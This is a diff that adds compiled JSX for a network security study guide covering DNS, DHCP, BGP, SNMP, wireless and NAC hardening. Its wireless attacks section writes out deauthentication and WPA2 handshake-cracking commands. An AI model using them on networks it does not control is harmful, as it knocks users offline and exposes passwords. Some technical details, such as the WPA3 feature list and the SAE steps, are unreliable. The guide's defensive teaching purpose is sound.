+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Advantages"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Disadvantages"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Granular containment (blast radius of 1 pod)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Complex policy management at scale"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Enables zero trust (default deny)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Requires SDN/SI integration"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Reduces attack surface"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Debugging connectivity issues is harder"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Compliance-friendly (PCI scope isolation)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Performance overhead (policy enforcement)"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Edge Cases:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "VLAN exhaustion:"
+        }), " Only 4094 VLANs (802.1Q limit); micro-segmentation uses VXLAN (16M segments)"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Broadcast storms:"
+        }), " Misconfigured STP or loops can bring down entire VLAN"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Dynamic workloads:"
+        }), " Containers that move require dynamic policy updates"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "IPv6:"
+        }), " VLANs work differently in IPv6 networks (no broadcast, uses multicast)"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-6-protocol-security",
+      children: "Section 6: Protocol Security"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "61-dns-security",
+      children: "6.1 DNS Security"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Threats:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "DNS Cache Poisoning (Kaminsky):"
+        }), " Inject fake DNS records into recursive resolver's cache"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "DNS Tunneling:"
+        }), " Encode data in DNS queries for exfiltration/C2"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "NXDOMAIN Attacks:"
+        }), " Flood resolvers with non-existent domain queries"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "DNS Amplification:"
+        }), " DDoS using open resolvers"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "DNSSEC (DNS Security Extensions):"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "DNSSEC adds digital signatures to DNS records:\n- RRSIG: Resource Record Signature (signs each record set)\n- DNSKEY: Public key for verification\n- DS: Delegation Signer (chain of trust)\n- NSEC/NSEC3: Authenticated denial of existence\n\nChain of Trust:\nRoot Zone → .com → example.com → www.example.com\n  (trust anchor) (DS record)    (DNSKEY)    (A + RRSIG)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "DNS Security Best Practices:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# 1. Rate-limit DNS queries\niptables -A INPUT -p udp --dport 53 -m limit --limit 100/s -j ACCEPT\n\n# 2. Disable recursion on authoritative servers\noptions {\n    allow-recursion { none; };\n    recursion no;\n};\n\n# 3. Use DNS over HTTPS (DoH) / DNS over TLS (DoT)\n# Unbound configuration:\nserver:\n    do-tls: yes\n    tls-cert-bundle: \"/etc/ssl/certs/ca-certificates.crt\"\nforward-zone:\n    name: \".\"\n    forward-tls-upstream: yes\n    forward-addr: 1.1.1.1@853#cloudflare-dns.com\n\n# 4. Query logging for anomaly detection\noptions {\n    querylog yes;\n};\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "62-dhcp-security",
+      children: "6.2 DHCP Security"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Threats:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "DHCP Starvation:"
+        }), " Exhaust IP pool with fake requests"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Rogue DHCP Server:"
+        }), " Attacker assigns malicious gateway/DNS"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "DHCP Spoofing:"
+        }), " Man-in-the-middle via fake DHCP responses"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "DHCP Snooping Configuration (Cisco):"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Enable DHCP snooping globally\nip dhcp snooping\n\n# Enable on VLANs\nip dhcp snooping vlan 10,20,30\n\n# Trust DHCP server ports\ninterface GigabitEthernet0/1\n    ip dhcp snooping trust\n\n# Rate-limit DHCP on access ports\ninterface GigabitEthernet0/2\n    ip dhcp snooping limit rate 10\n\n# Enable option-82 (circuit ID)\nip dhcp snooping information option\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "63-bgp-security",
+      children: "6.3 BGP Security"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Threats:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "BGP Hijacking:"
+        }), " Malicious AS announces prefixes it does not own"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Route Leak:"
+        }), " Misconfigured BGP router advertises learned routes to wrong peer"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Prefix De-aggregation:"
+        }), " Hijacker announces more specific prefix to intercept traffic"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "BGP Hijacking Example (YouTube 2008):"
+      }), "\nPakistan Telecom hijacked YouTube's prefix (208.65.153.0/24) by announcing a more specific /24, causing global outage."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "BGP Security Controls:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# 1. Prefix Filtering (both directions)\nip prefix-list ALLOWED-PREFIXES seq 5 permit 192.0.2.0/24 le 24\n\nneighbor 203.0.113.1 prefix-list ALLOWED-PREFIXES in\nneighbor 203.0.113.1 prefix-list CUSTOMER-PREFIXES out\n\n# 2. Max-prefix limit\nneighbor 203.0.113.1 maximum-prefix 1000 80 restart 30\n\n# 3. TTL Security Check (GTSM)\nneighbor 203.0.113.1 ttl-security hops 1\n\n# 4. RPKI (Resource Public Key Infrastructure)\n# Validates that AS is authorized to originate prefix\nrouter bgp 64500\n    bgp rpki server tcp 192.0.2.10 port 323\n    rpki table\n    neighbor 203.0.113.1 rpki route-map RPKI-FILTER in\n\nroute-map RPKI-FILTER permit 10\n    match rpki valid\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "64-snmp-security",
+      children: "6.4 SNMP Security"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Threats:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "SNMP Community String Brute Force:"
+        }), " Default strings \"public\"/\"private\""]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "SNMP Information Leak:"
+        }), " Full system information through ", (0,jsx_runtime.jsx)(_components.code, {
+          children: "snmpwalk"
+        })]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "SNMP DDoS:"
+        }), " Amplification via open SNMP (default port 161)"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "SNMPv3 Configuration (Secure):"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Create SNMPv3 user with auth + encryption\nnet-snmp-config --create-snmpv3-user \\\n  -a SHA512 \\\n  -A \"StrongAuthPass123!\" \\\n  -x AES256 \\\n  -X \"StrongPrivPass456!\" \\\n  monitor-user\n\n# snmpwalk with v3 authentication\nsnmpwalk -v3 \\\n  -u monitor-user \\\n  -l authPriv \\\n  -a SHA512 \\\n  -A \"StrongAuthPass123!\" \\\n  -x AES256 \\\n  -X \"StrongPrivPass456!\" \\\n  192.168.1.100 system\n\n# Expected output:\n# SNMPv2-MIB::sysDescr.0 = STRING: Linux server 5.15.0-generic\n# SNMPv2-MIB::sysUpTime.0 = Timeticks: (1234567) 3:25:45.67\n# SNMPv2-MIB::sysContact.0 = STRING: admin@example.com\n# ...\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "SNMP Security Best Practices:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# 1. Block SNMP at firewall\niptables -A INPUT -p udp --dport 161 -j DROP\niptables -A INPUT -p tcp --dport 161 -j DROP\n\n# 2. Restrict SNMP to management subnet\niptables -A INPUT -p udp --dport 161 -s 10.0.0.0/8 -j ACCEPT\n\n# 3. Disable SNMPv1/v2c (community strings)\n# /etc/snmp/snmpd.conf\nagentAddress udp:127.0.0.1:161\ncreateUser admin SHA512 \"authpass\" AES256 \"privpass\"\nrouser admin authPriv\n\n# 4. Limit MIB tree access\nview system-only included .1.3.6.1.2.1.1\naccess MyUserGroup \"\" any noauth exact system-only none none\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-7-wireless-security",
+      children: "Section 7: Wireless Security"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "71-overview",
+      children: "7.1 Overview"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Wireless networks use radio waves, which propagate through walls and are inherently vulnerable to:"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Eavesdropping (packet sniffing)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Unauthorized access (wardriving)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Man-in-the-middle (evil twin)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Denial of service (deauthentication attacks)"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Real-World Analogy:"
+      }), " Wireless communication is like two people talking in a crowded room → anyone can listen. You need encryption (a secret language) and authentication (voice recognition) to keep conversations private."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "72-wpa2-vs-wpa3",
+      children: "7.2 WPA2 vs WPA3"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Feature"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "WPA2"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "WPA3"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Authentication"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "PSK (Pre-Shared Key)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SAE (Simultaneous Authentication of Equals)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Encryption"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "CCMP/AES-128"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "GCMP/AES-256"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Key Exchange"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "4-Way Handshake (offline brute-forceable)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SAE Handshake (forward secrecy)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "KRACK Vulnerability"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Susceptible (KRACK CVE-2017-13077)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Resistant (MGTK/IGTK rotation)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Offline Brute Force"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Possible (capture 4-way handshake)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Not feasible (SAE prevents offline attack)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "PMF (Protected Management Frames)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Optional (802.11w)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Mandatory"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Target Wake Time"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (IoT power saving)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Backward Compatibility"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "N/A"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Mixed-mode WPA3/WPA2 transition"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Public Wi-Fi"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Open (no encryption)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "OWE (Opportunistic Wireless Encryption)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Password Guessing"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "4-way handshake captured offline"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SAE requires online interaction per guess"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "73-8021x--eap",
+      children: "7.3 802.1X / EAP"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Enterprise Wireless Authentication:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "[Supplicant] ---EAP over LAN--- [Authenticator (AP)] ---RADIUS--- [Authentication Server (FreeRADIUS)]\n    ^                                                              ^\n  Laptop with cert                                              AD/LDAP\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "EAP Methods:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Method"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Security"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Description"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "EAP-TLS"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Very High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Certificate on both client and server"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "EAP-TTLS"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Server certificate + tunneled password"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "EAP-PEAP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Server certificate + MSCHAPv2 in TLS tunnel"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "EAP-FAST"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Protected Access Credential (Cisco)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "LEAP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "LOW (deprecated)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "MSCHAPv2 vulnerabilities"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "FreeRADIUS Configuration:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# /etc/freeradius/3.0/clients.conf\nclient 192.168.1.0/24 {\n    secret = radius-secret-key\n    shortname = internal-ap\n}\n\n# /etc/freeradius/3.0/mods-enabled/eap\neap {\n    default-eap-type = ttls\n    timer-expire = 60\n    \n    tls-config tls-common {\n        private-key-file = /etc/ssl/certs/server.key\n        certificate-file = /etc/ssl/certs/server.crt\n        ca-file = /etc/ssl/certs/ca.crt\n    }\n}\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "74-rogue-ap-detection",
+      children: "7.4 Rogue AP Detection"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Methods to detect rogue access points:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# 1. Wireless survey with airodump-ng\nairodump-ng wlan0\n\n# Expected output:\n# BSSID              PWR  Beacons    #Data, CH  MB   ENC  CIPHER AUTH ESSID\n# 00:11:22:33:44:55 -45   120        532    6   54e  WPA2 CCMP   PSK   Corporate-WiFi\n# AA:BB:CC:DD:EE:FF -30  5          0      11  54e  WPA2 CCMP   PSK   !FREE_WIFI!   ← ROUGE (stronger signal, unknown ESSID)\n# 66:77:88:99:AA:BB -65   45         0      1   54e  WPA2 CCMP   PSK   ⋯\n\n# 2. Check for APs with same SSID but different BSSID (evil twin)\n# Any SSID advertised by multiple BSSIDs should be investigated\n\n# 3. Compare wired and wireless MAC addresses\n# Rogue APs often bridge wireless to wired network\n# Use nmap to discover wired devices and cross-reference\n\n# 4. WIPS (Wireless IPS) → automated detection\n# Cisco MSE, AirMagnet, or open-source Kismet\nkismet -c wlan0\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "75-wireless-attacks",
+      children: "7.5 Wireless Attacks"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Deauthentication Attack:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Send deauth frames to disconnect client\naireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0\n\n# Parameters:\n# -0 = deauth attack\n# 5  = send 5 deauth packets\n# -a = AP BSSID\n# -c = client MAC\n\n# Expected output:\n# 12:34:56  Sending 64 directed DeAuth.  STMAC: [AA:BB:CC:DD:EE:FF] [5|5 ACKs]\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "WPA2 Handshake Capture:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Capture in monitor mode\nairmon-ng start wlan0\nairodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon\n\n# When a client connects (or force deauth), handshake is captured:\n# Expected: [ WPA handshake: 00:11:22:33:44:55 ]\n\n# Crack handshake offline\naircrack-ng -w rockyou.txt capture-01.cap\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "76-wpa3-security",
+      children: "7.6 WPA3 Security"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "SAE (Simultaneous Authentication of Equals):"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Step 1: Both parties commit to a shared password-derived element\nStep 2: Each generates an ephemeral private key (random scalar)\nStep 3: Each sends commitment = H(password_identifier + scalar + element)\nStep 4: Each sends confirm = H(commitment + scalar + element)\nStep 5: On match → mutual authentication complete, PMK derived\n\nKey properties:\n- No offline dictionary attack: attacker must commit before seeing response\n- Forward secrecy: session key derived from ephemeral keys\n- Resistance to KRACK: different keys per session\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "OWE (Opportunistic Wireless Encryption) → RFC 8110:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "For public Wi-Fi: each client gets a unique per-connection encryption key without needing a password."
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-8-network-access-control-nac",
+      children: "Section 8: Network Access Control (NAC)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "81-overview",
+      children: "8.1 Overview"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "NAC controls which devices can access the network based on policy compliance."
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "NAC Flow:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "1. Device connects to network port or Wi-Fi\n2. NAC checks device identity (MAC, certificate, credentials)\n3. NAC checks compliance (OS patch level, AV running, disk encryption)\n4. Decision:\n   - Compliant: Full network access\n   - Non-compliant: Quarantine VLAN (limited access)\n   - Unknown: Registration VLAN (device enrollment)\n5. Post-admission: Continuous monitoring (re-authentication)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "NAC Technologies:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Solution"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Type"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Description"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "802.1X"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Standard"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Port-based authentication (wired + wireless)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Cisco ISE"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Enterprise"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Profiling, posture, guest management"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "PacketFence"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Open Source"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "NAC with captive portal"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Forescout"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Enterprise"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Agentless, passive monitoring"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "PacketFence Basic Configuration:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-yaml",
+        children: "# /usr/local/pf/conf/pf.conf\n[general]\ndomain = example.com\ndhcp = enabled\n\n[network 192.168.1.0]\nnetmask = 255.255.255.0\ngateway = 192.168.1.1\n\n[registration]\nrequire_dns = disabled\n\n[vlan]\nregistration = 10\nisolation = 20\nnormal = 1\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "82-nac-edge-cases",
+      children: "8.2 NAC Edge Cases"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
